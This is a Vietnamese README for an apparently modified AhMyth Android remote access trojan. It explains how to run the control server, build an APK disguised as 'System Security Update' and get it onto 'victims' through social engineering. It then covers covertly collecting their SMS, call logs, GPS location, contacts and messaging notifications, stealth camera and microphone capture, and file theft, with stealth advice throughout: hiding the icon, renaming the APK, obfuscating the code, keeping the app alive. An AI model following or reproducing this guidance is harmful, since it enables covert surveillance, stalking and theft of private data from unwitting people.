# 📖 Hướng Dẫn Cài Đặt & Sử Dụng

## 📋 Mục Lục

1. [Yêu Cầu Hệ Thống](#yêu-cầu-hệ-thống)
2. [Cài Đặt Server](#cài-đặt-server)
3. [Build APK](#build-apk)
4. [Sử Dụng](#sử-dụng)
5. [Troubleshooting](#troubleshooting)

---

## 🖥️ Yêu Cầu Hệ Thống

### Server (Windows/Linux/Mac)
- Node.js (bất kỳ version)
- npm
- 2GB RAM
- 500MB disk space

### Client (Android)
- Android 4.1+ (API 16+)
- Tốt nhất: Android 7.0 - 12.0

---

## 🚀 Cài Đặt Server

### Bước 1: Clone Repository

```bash
git clone https://github.com/dinhkhanhtung/SystemUpdate
cd SystemUpdate/AhMyth-Server/app
```

### Bước 2: Cài Đặt Dependencies

```bash
npm install
```

### Bước 3: Khởi Động Server

```bash
npm start
```

**Hoặc dùng script:**
```bash
# Windows
Run_AhMyth_Server.bat

# Linux/Mac
./run_server.sh
```

Server sẽ mở UI tại cổng mặc định.

---

## 📱 Build APK

### Cách 1: Qua UI (Khuyến nghị)

1. Mở server UI
2. Click "APK Builder"
3. Nhập thông tin:
   - **Server IP:** IP public hoặc local của bạn
   - **Server Port:** 5555 (mặc định)
   - **App Name:** System Security Update
4. Click "Build"
5. Đợi build xong → Download APK

### Cách 2: Script (Nhanh hơn)

**Windows:**
```bash
Build_Optimized_APK.bat
```

**Cấu hình trong script:**
- Sửa IP server trong file `ConnectionManager.java`
- Build với ProGuard enabled
- Output: `Output/app-release.apk`

---

## 💡 Sử Dụng

### 1. Cài APK Trên Victim

**Gửi APK:**
- Email
- USB
- Cloud storage (Google Drive, Dropbox)
- Social engineering

**Victim cài đặt:**
1. Mở APK
2. Cho phép "Unknown sources"
3. Cài đặt
4. App yêu cầu permissions
5. Cấp tất cả permissions
6. App tự động ẩn icon

### 2. Kết Nối

**Tự động:**
- App tự động kết nối đến server
- Hiển thị trong danh sách victims
- Watchdog tự động reconnect mỗi 3 phút

**Thủ công (nếu cần):**
- Mở app (ẩn trong Settings)
- Click "Connect"

### 3. Giám Sát

**Xem thông tin victim:**
- IP, Location, Device info
- Online/Offline status
- Last seen time

**Thu thập dữ liệu:**

#### 📍 Vị Trí GPS
- Tự động cập nhật mỗi 30 phút
- Xem realtime trên bản đồ
- Lịch sử vị trí trong database

#### 📱 SMS
- Tự động đồng bộ realtime
- Lưu trước khi họ kịp xóa
- Xem inbox & sent

#### 📞 Call Logs
- Tự động đồng bộ realtime
- Incoming, Outgoing, Missed
- Thời lượng cuộc gọi

#### 💬 Notifications (Zalo/Messenger/etc)
- Tự động capture
- Lưu title & content
- Timestamp chính xác

#### 👥 Contacts
- Lấy toàn bộ danh bạ
- Tên, số điện thoại, email

#### 📸 Camera
- Chụp ảnh Front/Back
- Tự động mở khóa màn hình nếu cần
- Stealth mode (no flash, no sound)

#### 🎤 Microphone
- Ghi âm môi trường
- Chất lượng tùy chỉnh
- Lưu file MP3

#### 📁 File Manager
- Duyệt file system
- Download files
- Xem ảnh/video

### 4. Export Dữ Liệu

**Export ra Excel:**
```javascript
// Trong UI (sẽ implement)
Click "Export" → "Excel"
```

**Export vị trí ra Google Maps:**
```javascript
Click "Export" → "KML"
// Mở file .kml bằng Google Earth
```

**Export tin nhắn ra Text:**
```javascript
Click "Export" → "Text"
```

---

## 🔧 Cấu Hình Nâng Cao

### Thay Đổi Server IP/Port

**File:** `AhMyth-Client/app/src/main/java/com/google/android/sys/security/ConnectionManager.java`

```java
// Dòng ~60
private static final String SERVER_IP = "YOUR_IP_HERE";
private static final int SERVER_PORT = 5555;
```

### Thay Đổi Tần Suất Cập Nhật

**Vị trí GPS:**
```java
// ConnectionManager.java, dòng ~24
private static final long LOCATION_UPDATE_INTERVAL_MS = 30 * 60 * 1000; // 30 phút
```

**Watchdog:**
```java
// ConnectionManager.java, dòng ~25
private static final long WATCHDOG_INTERVAL_MS = 3 * 60 * 1000; // 3 phút
```

### Bypass Battery Optimization

**Tự động:**
- App tự động yêu cầu khi khởi động
- Victim chỉ cần click "Allow"

**Thủ công:**
```
Settings → Battery → Battery Optimization
→ All apps → System Security Update → Don't optimize
```

---

## 🐛 Troubleshooting

### Server không khởi động

**Lỗi:** `SyntaxError: Unexpected token`

**Giải pháp:**
- Đã fix! Database dùng JSON thay vì SQLite
- Chạy `npm install` lại
- Xóa `node_modules` và cài lại

### Victim không kết nối

**Kiểm tra:**

1. **Server IP đúng chưa?**
   - Dùng IP public nếu khác mạng
   - Dùng IP local nếu cùng mạng
   - Kiểm tra: `ipconfig` (Windows) hoặc `ifconfig` (Linux)

2. **Port có mở không?**
   - Kiểm tra firewall
   - Mở port 5555 (hoặc port bạn dùng)

3. **Victim có internet không?**
   - Kiểm tra WiFi/Mobile data
   - Thử ping server từ victim

4. **App có chạy không?**
   - Kiểm tra trong Settings → Apps
   - Kiểm tra battery optimization
   - Restart app nếu cần

### Không chụp được ảnh khi màn hình khóa

**Nguyên nhân:**
- Android 10+ với khóa bảo mật (PIN/Pattern)
- Battery optimization chưa bypass

**Giải pháp:**
- Bypass battery optimization
- Đợi họ mở khóa rồi chụp
- Hoặc chấp nhận có lock screen trong ảnh

### Realtime sync không hoạt động

**Kiểm tra:**
- App có quyền đọc SMS/Call Log không?
- Battery optimization đã bypass chưa?
- Doze mode có ảnh hưởng không?

**Giải pháp:**
- Cấp lại permissions
- Bypass battery optimization
- Disable Doze mode cho app

---

## 📊 Xem Dữ Liệu

### Database JSON

**File:** `AhMyth-Server/app/data/database.json`

```bash
# Xem toàn bộ
cat data/database.json

# Tìm kiếm
grep "phone_number" data/database.json
```

### Log Files

**Thư mục:** `AhMyth-Server/app/logs/<victim_id>/`

```bash
# Xem vị trí realtime
tail -f logs/<victim_id>/locations.log

# Xem SMS realtime
tail -f logs/<victim_id>/realtime_sms.log

# Xem Call realtime
tail -f logs/<victim_id>/realtime_calls.log
```

---

## 🔐 Bảo Mật

### Dữ Liệu Server

**Backup:**
```bash
# Backup database
cp data/database.json data/backup_$(date +%Y%m%d).json

# Backup logs
tar -czf logs_backup.tar.gz logs/
```

**Mã hóa (khuyến nghị):**
- Encrypt database.json
- Encrypt log files
- Sử dụng SSL cho Socket.IO

### APK Security

**ProGuard:**
- Đã enable mặc định
- Obfuscate code
- Khó reverse engineer

**Permissions:**
- Chỉ yêu cầu permissions cần thiết
- Giải thích rõ ràng cho victim

---

## 📈 Performance

### Tối Ưu Server

**RAM:**
- Mặc định: ~200MB
- Với 10 victims: ~500MB
- Với 100 victims: ~2GB

**CPU:**
- Idle: < 5%
- Active: 10-20%

**Disk:**
- Database: ~10MB / victim / tháng
- Logs: ~50MB / victim / tháng

### Tối Ưu Client

**Battery:**
- Idle: < 1% / ngày
- Active: < 3% / ngày

**Data:**
- Realtime sync: ~1MB / ngày
- Location updates: ~500KB / ngày

**Storage:**
- App size: ~5MB
- Cache: < 10MB

---

## 🎯 Best Practices

### 1. Server Setup
- Sử dụng VPS với IP tĩnh
- Mở port firewall
- Backup database định kỳ
- Monitor server uptime

### 2. APK Distribution
- Đổi tên APK (không dùng "RAT", "Spy", etc)
- Sử dụng icon hợp lý
- Giải thích permissions rõ ràng
- Social engineering hiệu quả

### 3. Data Collection
- Thu thập dữ liệu định kỳ
- Export backup thường xuyên
- Phân tích dữ liệu có hệ thống
- Xóa dữ liệu cũ không cần thiết

### 4. Stealth
- Bypass battery optimization
- Ẩn icon sau khi cấp quyền
- Tắt notifications
- Sử dụng tên app hợp lý

---

## 🆘 Hỗ Trợ

**Gặp vấn đề?**

1. Kiểm tra [Troubleshooting](#troubleshooting)
2. Xem log files
3. Kiểm tra GitHub Issues
4. Tạo Issue mới với thông tin chi tiết

**Thông tin cần cung cấp:**
- OS version (Server & Client)
- Node.js version
- Android version
- Log files
- Steps to reproduce

---

**Happy Monitoring! 🎯**
